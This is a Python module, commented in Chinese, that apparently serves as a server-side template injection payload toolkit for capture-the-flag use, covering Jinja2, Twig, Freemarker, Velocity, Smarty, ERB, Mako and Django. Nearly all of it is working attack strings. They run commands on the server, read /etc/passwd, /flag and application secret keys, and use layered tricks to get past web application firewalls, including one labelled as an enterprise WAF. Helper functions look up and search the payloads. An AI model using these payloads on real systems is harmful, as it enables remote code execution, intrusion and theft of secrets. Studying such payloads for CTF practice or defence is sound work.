# -*- coding: utf-8 -*-
"""SSTI (Server-Side Template Injection) Payload 生成器.

支持模板引擎:
    - Jinja2 / Flask
    - Twig (PHP)
    - Freemarker (Java)
    - Velocity (Java)
    - Smarty (PHP)
    - ERB (Ruby)
    - Mako / Tornado (Python)
    - Django (Python)
    - Jade / Pug (Node.js)
    - Handlebars (Node.js)
"""
from typing import List, Dict


# ═══════════════════════════════════════════════════════════
#  检测 Payload (Fingerprinting)
# ═══════════════════════════════════════════════════════════

DETECTION: Dict[str, List[str]] = {
    "Jinja2 (Flask)": [
        "{{7*7}}",                          # 预期: 49
        "{{'test'.upper()}}",               # 预期: TEST
        "{{config}}",                       # 预期: <Config ...>
        "{{[].__class__.__base__}}",        # 对象探测
        "{{''.__class__.__mro__}}",
        "${7*7}",                           # 替代语法
        "{{self.__init__.__globals__}}",
    ],
    "Twig (PHP/Symfony)": [
        "{{7*7}}",                          # 预期: 49
        "{{_self.env}}",                    # 环境泄露
        "{{dump(app)}}",                    # dump 函数
        "{{include('index.html')}}",        # 文件包含
        "{{'/etc/passwd'|file_excerpt(1,30)}}",
    ],
    "Freemarker (Java)": [
        "${7*7}",                           # 预期: 49
        "${product('test')}",
        "<#assign x=7*7>${x}</#assign>",    # 赋值语法
        "${.data_model.key_set()}",
        "${object.getClass()}",
    ],
    "Velocity (Java)": [
        "#set($x=7*7)$x",                   # 预期: 49
        "${class}",
        "#set($runtime = $class.forName('java.lang.Runtime'))",
    ],
    "Smarty (PHP)": [
        "{$smarty.version}",
        "{7*7}",
        "{php}echo 'test';{/php}",
        "{include file='index.php'}",
        "{system('id')}",
    ],
    "ERB (Ruby)": [
        "<%= 7*7 %>",                       # 预期: 49
        "<%= system('id') %>",
        "<%= File.read('/etc/passwd') %>",
        "<%= `ls` %>",
    ],
    "Mako (Python)": [
        "${7*7}",                           # 预期: 49
        "${self.module.cache.util.os}",
        "<% import os %>${os.popen('id').read()}",
    ],
    "Django": [
        "{{ 7*7 }}",
        "{% debug %}",
        "{{ settings.SECRET_KEY }}",
        "{% include './settings.py' %}",
    ],
}


# ═══════════════════════════════════════════════════════════
#  利用 Payload (RCE / 文件读取)
# ═══════════════════════════════════════════════════════════

EXPLOIT: Dict[str, List[Dict[str, str]]] = {
    "Jinja2 (Flask)": [
        {
            "name": "RCE - subprocess.Popen (最常用, 无WAF)",
            "payload": "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
        },
        {
            "name": "RCE - __subclasses__ 链",
            "payload": "{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['sys'].modules['os'].popen('id').read() }}",
            "note": "X 需要替换为 subprocess.Popen 的索引, 用搜索功能查找",
        },
        {
            "name": "RCE - lipsum 方式 (无WAF)",
            "payload": "{{ lipsum.__globals__['os'].popen('id').read() }}",
        },
        {
            "name": "RCE - request.application",
            "payload": "{{ request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read() }}",
        },
        {
            "name": "RCE - config 方式",
            "payload": "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
        },
        {
            "name": "RCE - joiner 方式 (备用)",
            "payload": "{{ joiner.__init__.__globals__.os.popen('id').read() }}",
        },
        {
            "name": "★ 文件读取 - builtins.open (绕过 popen 禁用)",
            "payload": "{{ lipsum.__globals__.__builtins__.open('/flag').read() }}",
            "note": "无需 popen, 直接 open 读文件 — 适用 popen 被WAF/沙箱禁用时",
        },
        {
            "name": "文件读取 - get_flashed_messages",
            "payload": "{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}",
        },
        {
            "name": "信息泄露 - config (SECRET_KEY等)",
            "payload": "{{ config }}",
        },
        {
            "name": "Bypass 过滤 [[]] - attr()",
            "payload": "{{ ()|attr('__class__')|attr('__base__')|attr('__subclasses__')() }}",
        },
        {
            "name": "Bypass 过滤 _ - request",
            "payload": "{{ (request|attr(request.args.attr)).__init__.__globals__.__builtins__ }}",
            "note": "需要传参 ?attr=__class__",
        },
        {
            "name": "Bypass 过滤引号 - request.args",
            "payload": "{{ lipsum.__globals__.__builtins__.open(request.args.f).read() }}",
            "note": "需要传参 ?f=/flag",
        },
        {
            "name": "Bypass - 字符串拼接 (+)",
            "payload": "{{ ()|attr('__cla'+'ss__')|attr('__bas'+'e__') }}",
        },
        {
            "name": "★ Bypass - 字符串拼接 (~) Jinja2 专用",
            "payload": "{{ lipsum|attr('__glo'~'bals__') }}",
            "note": "★ Blank Check 实战验证: ~ 运算符绕过关键字黑名单 (如 __globals__)",
        },
        {
            "name": "★ Bypass - 三合一完整链 (点→attr, 关键字→~拼接, []→__getitem__)",
            "payload": "{{lipsum|attr('__glo'~'bals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('open')('/flag')|attr('read')()}}",
            "note": "★ Blank Check 完整攻击链: 绕过点号 + __globals__关键字 + 方括号 三重WAF",
        },
        {
            "name": "Bypass - 十六进制",
            "payload": "{{ ()['\\x5f\\x5fclass\\x5f\\x5f'] }}",
        },
        {
            "name": "★ 文件列表 - __import__ 动态导入",
            "payload": "{{lipsum|attr('__glo'~'bals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__imp'~'ort__')('os')|attr('listdir')('/')}}",
            "note": "当 os 被拦截时通过 __import__ 动态加载",
        },
    ],
    "Twig (PHP/Symfony)": [
        {
            "name": "RCE - sort filter",
            "payload": "{{ ['id', '']|sort('system') }}",
        },
        {
            "name": "RCE - filter",
            "payload": "{{ ['cat /flag']|filter('system') }}",
        },
        {
            "name": "RCE - map filter",
            "payload": "{{ ['whoami']|map('system')|join }}",
        },
        {
            "name": "文件读取 - file_excerpt",
            "payload": "{{ '/etc/passwd'|file_excerpt(1, -1) }}",
        },
        {
            "name": "信息泄露 - _self",
            "payload": "{{ _self.env.registerUndefinedFilterCallback('system') }}{{ ['id']|map('system') }}",
        },
    ],
    "Freemarker (Java)": [
        {
            "name": "RCE - Execute (经典)",
            "payload": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /flag')}",
        },
        {
            "name": "RCE - ObjectConstructor",
            "payload": "${'freemarker.template.utility.ObjectConstructor'?new()('java.lang.ProcessBuilder','cat','/flag').start()}",
        },
        {
            "name": "RCE - JythonRuntime",
            "payload": "${'freemarker.template.utility.JythonRuntime'?new()('import os;os.system(\"id\")')}",
        },
    ],
    "Velocity (Java)": [
        {
            "name": "RCE - Runtime.exec",
            "payload": "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$chr.toString($out.read())#end",
        },
    ],
    "Smarty (PHP)": [
        {
            "name": "RCE - system",
            "payload": "{system('cat /flag')}",
        },
        {
            "name": "RCE - php 标签",
            "payload": "{php}system('id');{/php}",
        },
        {
            "name": "文件读取 - include",
            "payload": "{include file='/etc/passwd'}",
        },
    ],
    "ERB (Ruby)": [
        {
            "name": "RCE - system",
            "payload": "<%= system('cat /flag') %>",
        },
        {
            "name": "RCE - 反引号",
            "payload": "<%= `cat /flag` %>",
        },
        {
            "name": "文件读取 - File.read",
            "payload": "<%= File.read('/flag') %>",
        },
        {
            "name": "文件读取 - IO.readlines",
            "payload": "<%= IO.readlines('/flag') %>",
        },
    ],
    "Mako (Python)": [
        {
            "name": "RCE - os.popen",
            "payload": "<%\nimport os\nx=os.popen('id').read()\n%>${x}",
        },
    ],
}


# ═══════════════════════════════════════════════════════════
#  Bypass / 过滤绕过分组
# ═══════════════════════════════════════════════════════════

BYPASS_FILTERS: Dict[str, List[str]] = {
    "引号过滤绕过": [
        "request.args.param          — 用 GET 参数传入字符串",
        "request.values.param        — 用 POST 参数传入字符串",
        "request.cookies.param       — 用 Cookie 传入字符串",
        "dict(__cl=dict,ass__=1)|join — 字典键拼接",
        "()|attr('\\x5f\\x5f'+'class\\x5f\\x5f') — 十六进制绕过",
    ],
    "点号过滤绕过": [
        "()|attr('__class__')        — attr() 过滤器",
        "()['__class__']             — 字典索引",
        "()|attr(request.args.a)     — 从请求参数取属性名",
    ],
    "下划线过滤绕过": [
        "request.args.param          — 从请求获取",
        "()|attr('\\x5f\\x5fclass\\x5f\\x5f') — 十六进制",
        "'_'*2~'class'~'_'*2         — 字符串拼接",
    ],
    "方括号过滤绕过": [
        "().__getitem__('class')     — __getitem__",
        "()|attr('__class__')        — attr",
        "().__class__                — 点号",
    ],
    "关键字过滤绕过 (字符串拼接)": [
        "__globals__ → '__glo'~'bals__'          — Jinja2 ~ 运算符拼接 (★实战验证)",
        "__subclasses__ → '__subcl'~'asses__'    — 同理",
        "popen → 'po'~'pen'                      — 同理",
        "__import__ → '__imp'~'ort__'            — 同理",
        "eval → __builtins__['ev'+'al']           — + 拼接",
        "class → __dict__['__cla'+'ss__']         — + 拼接",
    ],
    "组合多级 WAF 绕过 (★ Blank Check 实战验证)": [
        "点 -> |attr()    |  关键字 -> ~ 拼接   |  方括号 -> |attr('__getitem__')",
        "完整链: lipsum|attr('__glo'~'bals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('open')('/flag')|attr('read')()",
        "文件读取: builtins.open() 替代 popen (当 popen/system 被禁时)",
        "模块导入: __builtins__['__imp'~'ort__']('os') 动态导入绕过",
    ],
    "Enterpris WAF bypass (★ Template Factory 实战 — taint-aware WAF)": [
        # 背景: WAF 对模板做 taint analysis, 能检测字符级构建的最终结果
        # 策略: 利用未过滤对象的方法/filter 间接访问
        "|list|last 索引: request.environ.values()|list|last → werkzeug.request 对象 (绕过 bracket)",
        "{{% for %}} environ 迭代: 枚举 WSGI environ 所有 key-value, 发现隐藏对象",
        "select/reject/map 等 generator filter: ALL 可用, WAF 只过滤特定 filter name",
        "replace 步进式构建: a|replace('0','c')|replace('1','o')... → 逐字构建 keyword",
        "|items filter 替代 .items(): dict|items → 可迭代 key-value pairs",
        "lipsum()|list[idx] 字符提取: (lipsum(n)|list)[5] → 提取单个字符",
        "namespace 对象暂存: ns=namespace(x=obj) → 存储禁止渲染的对象引用",
        "{% set %} 多步链: 每步单独 {%set%} 再后续使用, 降低单步可疑度",
        "cycler 生成器利用: cycler.next()/reset()/current 访问状态化对象",
        "|int/|string/|float 类型转换: 基础类型转换 filter 均可用",
        "BytesIO access: wr.stream → 文件类对象, getvalue() 方法可用",
    ],
}


# ═══════════════════════════════════════════════════════════
#  WAF 绕过链 — 已验证的完整多级绕过 Payload
# ═══════════════════════════════════════════════════════════

WAF_BYPASS_CHAINS: Dict[str, List[Dict[str, str]]] = {
    "点号 + 关键字 + 方括号 三重绕过 (Jinja2)": [
        {
            "name": "文件读取 — builtins.open (绕过 popen 禁用)",
            "payload": "{{lipsum|attr('__glo'~'bals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('open')('/flag')|attr('read')()}}",
            "note": "★ Blank Check 验证: 点→attr, 关键字→~拼接, 方括号→__getitem__)",
        },
        {
            "name": "文件列表 — os.listdir",
            "payload": "{{lipsum|attr('__glo'~'bals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__imp'~'ort__')('os')|attr('listdir')('/')}}",
            "note": "当直接访问 os 被拦时的替代方案",
        },
        {
            "name": "命令执行 — __import__ + popen",
            "payload": "{{lipsum|attr('__glo'~'bals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__imp'~'ort__')('os')|attr('po'~'pen')('cat /flag')|attr('read')()}}",
            "note": "popen 也被黑名单时需进一步拼接",
        },
        {
            "name": "文件读取 — exec + open (无 popen)",
            "payload": "{{lipsum|attr('__glo'~'bals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('exec')('print(open(\"/flag\").read())')}}",
            "note": "当 popen 和直接 open 都被拦时的替代",
        },
    ],
    "attr() 全链绕过 (仅绕过点号)": [
        {
            "name": "config 泄露",
            "payload": "{{config}}",
            "note": "部分 WAF 不过滤{{}} — 直接获取 SECRET_KEY",
        },
        {
            "name": "__class__ 链 via attr",
            "payload": "{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subcl'~'asses__')()}}",
            "note": "完整 object → subclasses 链, 使用 ~ 绕过 subclasses 黑名单",
        },
        {
            "name": "cycler RCE (无 WAF)",
            "payload": "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}",
            "note": "无 WAF 时的最简单 payload",
        },
        {
            "name": "namespace RCE (无 WAF)",
            "payload": "{{namespace.__init__.__globals__.os.popen('cat /flag').read()}}",
            "note": "备用 payload, cycler 可能被禁",
        },
    ],
    "request.args 绕过 (通过 URL 参数传递黑名单词)": [
        {
            "name": "属性名通过 GET 参数",
            "payload": "{{''|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)()}}&a=__class__&b=__base__&c=__subclasses__",
            "note": "当 payload 中的关键字被后端/前端 WAF 检测时使用",
        },
    ],
    "enterpris WAF — 步进式 replace 构建 (★ Template Factory)": [
        {
            "name": "config 绕过 — replace 步进",
            "payload": "{%set a='ABCDEF'%}{%set a=a|replace('A','c')|replace('B','o')|replace('C','n')|replace('D','f')|replace('E','i')|replace('F','g')%}{{a}}",
            "note": "WAF 做 taint analysis 时, step-by-step replace 可能被分析, 但可尝试用 cycler/random 打乱",
        },
        {
            "name": "environ 遍历 — 发现 werkzeug.request",
            "payload": "{%for k in request.environ%}{{k}}|{%endfor%}",
            "note": "枚举所有 WSGI environ key, 发现 werkzeug.request / wsgi.input / wsgi.errors",
        },
        {
            "name": "werkzeug.request 捕获 — |list|last 索引",
            "payload": "{%set wr=request.environ.values()|list|last%}{{wr.path}}",
            "note": "通过 values() → list → last 获取最后一个值 (werkzeug.request), 避免 bracket 触发 WAF",
        },
        {
            "name": "BytesIO stream 访问",
            "payload": "{%set wr=request.environ.values()|list|last%}{{wr.stream}}",
            "note": "Request.stream 是 BytesIO, 可访问 getvalue() 等方法",
        },
        {
            "name": "wsgi.input 捕获 (BufferedReader)",
            "payload": "{%set inp=request.environ.values()|list%}{{inp[2]}}",
            "note": "wsgi.input 在 values list 的 index 2, 是 _io.BufferedReader",
        },
        {
            "name": "lipsum 字符提取",
            "payload": "{{(lipsum()|list)[5]}}",
            "note": "从 lipsum 输出中提取单个字符 (注意每次调用输出不同, 位置不固定)",
        },
    ],
}


def get_detection(engine: str = "") -> dict:
    """获取检测 Payload 列表."""
    if engine and engine in DETECTION:
        return {engine: DETECTION[engine]}
    return DETECTION


def get_exploit(engine: str = "") -> dict:
    """获取利用 Payload 列表."""
    if engine and engine in EXPLOIT:
        return {engine: EXPLOIT[engine]}
    return EXPLOIT


def get_bypass() -> dict:
    """获取绕过过滤的技巧列表."""
    return BYPASS_FILTERS


def get_waf_bypass_chains() -> dict:
    """获取已验证的 WAF 绕过链 (多级组合绕过)."""
    return WAF_BYPASS_CHAINS


def search_payload(keyword: str) -> list:
    """在所有 Payload 中搜索关键字 (包括 EXPLOIT 和 WAF_BYPASS_CHAINS)."""
    results = []
    for engine, payloads in EXPLOIT.items():
        for p in payloads:
            if keyword.lower() in p["payload"].lower() or keyword.lower() in p.get("note", "").lower():
                results.append({"source": "exploit", "engine": engine, **p})
    for chain_name, payloads in WAF_BYPASS_CHAINS.items():
        for p in payloads:
            if keyword.lower() in p["payload"].lower() or keyword.lower() in p.get("note", "").lower():
                results.append({"source": "waf_bypass", "chain": chain_name, **p})
    return results


def subclasses_finder() -> str:
    """生成用于查找 subprocess.Popen 索引的检测 Payload."""
    return (
        "{{ ''.__class__.__mro__[1].__subclasses__() }}"
        "\n# 在输出中搜索 'subprocess.Popen', 记下它的索引 (从0开始数)"
        "\n# 然后将 X 替换为该索引:"
        "\n# {{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['sys'].modules['os'].popen('id').read() }}"
    )
